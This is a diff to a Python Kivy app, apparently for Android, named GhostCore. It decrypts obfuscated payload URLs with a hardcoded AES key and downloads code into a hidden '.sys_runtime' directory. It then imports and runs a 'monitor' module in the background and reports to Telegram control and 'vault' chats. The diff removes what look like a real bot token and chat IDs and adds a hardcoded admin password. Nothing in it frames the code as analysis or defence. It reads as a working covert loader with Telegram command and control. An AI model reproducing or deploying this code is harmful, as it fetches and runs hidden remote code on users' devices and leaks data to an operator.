@@ -5,17 +5,17 @@ import time
 import json
 import base64
 import threading
+import traceback
 import requests
+from kivy.app import App
+from kivy.uix.textinput import TextInput
+from kivy.uix.boxlayout import BoxLayout
+from kivy.clock import Clock
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 
-try:
-    from secrets import ENCRYPTION_KEY, BOT_TOKENS, CONTROL_ID, VAULT_ID
-except ImportError:
-    ENCRYPTION_KEY = b'MySup3rS3cr3tK3y1234567890123456'
-    BOT_TOKENS = ["8369506331:AAFbMuU5NsVPWP9y977xG_lLaG1-pdGBs-Q"]
-    CONTROL_ID = "-1003365166986"
-    VAULT_ID = "-1003787520015"
+# ---------------------- إعدادات التشفير ----------------------
+ENCRYPTION_KEY = b'MySup3rS3cr3tK3y1234567890123456'
 
 PAYLOAD_URLS_ENCRYPTED = [
     "EGGGMNBl63GSytsYOAquCrvXIT5UrpIQk1xoilC2hgjPqywUXsNAsXbtl1yjOr7fQbnvNRgs3cGrlP3cWzUViDXscfGcIlfN0pxv72cisTI5S/fkAO2TC/Ilx1SykTMtQKeUwUuhQIVcT4Sg4i/8h196IY43lrJdtnjHXpudh3CYRna2Rel3unRovTyoiZhMi2r4dnI57TVrfwNmI2x4/A==",
@@ -34,40 +34,133 @@ PAYLOAD_URLS_ENCRYPTED = [
     "YamuPJ3pwOHIJHgdRacSE3eZ5zYlQv9mi39+kQcPNg1EtS8hNdA7uxbM22zSjt3+6NxPpqJFBgFnUgvGRTQ9hqdGMAg+BA7uBNs6Yz4e4D8yc4SDJSpVIWvPy5/NT3GsLSJQCF+NPOnjw8tjlddBbjROcO0aSgKqqwFuEpAJQtSHFWouOBo/nVIrv6UbgJgmK55KXf1goxllPS6Ohqx2wCs="
 ]
 
-def decrypt_url(enc):
-    data = base64.b64decode(enc)
-    iv, tag, ct = data[:12], data[-16:], data[12:-16]
-    cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.GCM(iv, tag), backend=default_backend())
-    return (cipher.decryptor().update(ct) + cipher.decryptor().finalize()).decode()
+BASE_DIR = os.path.join(os.getcwd(), ".sys_runtime")
+if not os.path.exists(BASE_DIR):
+    os.makedirs(BASE_DIR)
+sys.path.append(BASE_DIR)
 
-class GhostCore:
-    def __init__(self):
-        self.work_dir = os.path.join(os.getcwd(), ".sys_core")
-        os.makedirs(self.work_dir, exist_ok=True)
-        sys.path.append(self.work_dir)
+def decrypt(encrypted_b64):
+    try:
+        data = base64.b64decode(encrypted_b64)
+        iv, tag, ciphertext = data[:12], data[-16:], data[12:-16]
+        cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.GCM(iv, tag), backend=default_backend())
+        decryptor = cipher.decryptor()
+        return (decryptor.update(ciphertext) + decryptor.finalize()).decode()
+    except:
+        return None
 
-    def download_payloads(self):
-        for enc in PAYLOAD_URLS_ENCRYPTED:
-            url = decrypt_url(enc)
-            name = url.split('/')[-1]
+try:
+    from secrets import BOT_TOKENS, CONTROL_ID, VAULT_ID, ADMIN_PASSWORD
+except ImportError:
+    BOT_TOKENS = ["YOUR_BOT_TOKEN"]
+    CONTROL_ID = "YOUR_CONTROL_CHAT_ID"
+    VAULT_ID = "YOUR_VAULT_CHAT_ID"
+    ADMIN_PASSWORD = "Zaen123@123@"
+
+class GhostCoreApp(App):
+    def build(self):
+        self.log_history = []
+        self.add_log("🚀 بدء تشغيل التطبيق...")
+        root = BoxLayout(orientation='vertical', padding=5)
+        self.console = TextInput(
+            text="[GhostCore v2.0 - Diagnostic Mode]\n",
+            readonly=True,
+            background_color=(0, 0, 0, 1),
+            foreground_color=(0, 1, 0, 1),
+            font_size='12sp'
+        )
+        root.add_widget(self.console)
+        Clock.schedule_once(self.run_engine, 0.5)
+        return root
+
+    def add_log(self, msg):
+        timestamp = time.strftime("%H:%M:%S")
+        entry = f"[{timestamp}] {msg}"
+        self.log_history.append(entry)
+        if hasattr(self, 'console'):
+            self.console.text += entry + "\n"
+        print(entry)
+
+    def send_telegram(self, message, is_error=False):
+        prefix = "❌ [ERROR] " if is_error else "✅ [INFO] "
+        full_msg = prefix + message[:4000]
+        for token in BOT_TOKENS:
             try:
-                r = requests.get(url, timeout=15)
-                if r.status_code == 200:
-                    with open(os.path.join(self.work_dir, name), 'w', encoding='utf-8') as f:
-                        f.write(r.text)
+                url = f"https://api.telegram.org/bot{token}/sendMessage"
+                requests.post(url, json={"chat_id": CONTROL_ID, "text": full_msg}, timeout=5)
+                break
             except:
                 continue
 
-    def start(self):
-        self.download_payloads()
+    def run_engine(self, dt):
+        try:
+            self.add_log("🔍 فحص بيئة التشغيل...")
+            for folder in ['core', 'telegram', 'config', 'media']:
+                exists = "✅" if os.path.isdir(folder) else "❌"
+                self.add_log(f"Folder '{folder}': {exists}")
+            import jnius
+            self.add_log("✅ Pyjnius loaded")
+            import cryptography
+            self.add_log("✅ Cryptography loaded")
+            self.add_log("📥 تحميل البايلودات المشفرة...")
+            self.download_payloads()
+            self.add_log("🏁 اكتملت الفحوصات. بدء تشغيل الخدمات الخلفية...")
+            self.start_services()
+            self.add_log("✅ التطبيق يعمل بنجاح في الخلفية.")
+            self.send_telegram("تم تشغيل التطبيق بنجاح على الجهاز.")
+        except Exception as e:
+            error_trace = traceback.format_exc()
+            self.add_log(f"❌ خطأ جسيم:\n{error_trace}")
+            self.send_telegram(f"انهيار عند التشغيل:\n{error_trace}", is_error=True)
+
+    def decrypt_url(self, enc):
+        return decrypt(enc)
+
+    def download_payloads(self):
+        self.add_log("بدء فك تشفير الروابط...")
+        for i, enc in enumerate(PAYLOAD_URLS_ENCRYPTED):
+            url = self.decrypt_url(enc)
+            if not url:
+                self.add_log(f"❌ فشل فك تشفير الرابط {i+1}")
+                continue
+            name = url.split('/')[-1]
+            self.add_log(f"تحميل {name}...")
+            try:
+                resp = requests.get(url, timeout=15)
+                if resp.status_code == 200:
+                    with open(os.path.join(BASE_DIR, name), 'w', encoding='utf-8') as f:
+                        f.write(resp.text)
+                    self.add_log(f"✅ تم تحميل {name}")
+                else:
+                    self.add_log(f"⚠️ فشل تحميل {name} (HTTP {resp.status_code})")
+            except Exception as e:
+                self.add_log(f"⚠️ خطأ في تحميل {name}: {e}")
+        self.add_log("اكتمل تحميل البايلودات.")
+
+    def start_services(self):
+        self.add_log("تشغيل Monitor...")
         try:
             import monitor
-            monitor.start(BOT_TOKENS, CONTROL_ID, VAULT_ID)
+            if hasattr(monitor, 'Monitor'):
+                mon = monitor.Monitor()
+                mon.admin_password = ADMIN_PASSWORD
+                mon.bot_tokens = BOT_TOKENS
+                mon.control_id = CONTROL_ID
+                mon.vault_id = VAULT_ID
+                threading.Thread(target=mon.start, daemon=True).start()
+                self.add_log("✅ Monitor started")
+            else:
+                self.add_log("⚠️ Monitor class not found")
+        except Exception as e:
+            self.add_log(f"❌ فشل تشغيل Monitor: {e}")
+
+if __name__ == '__main__':
+    try:
+        GhostCoreApp().run()
+    except Exception as e:
+        try:
+            requests.post(f"https://api.telegram.org/bot{BOT_TOKENS[0]}/sendMessage",
+                          json={"chat_id": CONTROL_ID, "text": f"🚨 انهيار قبل الإقلاع:\n{traceback.format_exc()[:4000]}"})
         except:
             pass
-
-if __name__ == "__main__":
-    core = GhostCore()
-    core.start()
-    while True:
-        time.sleep(60)
+        raise
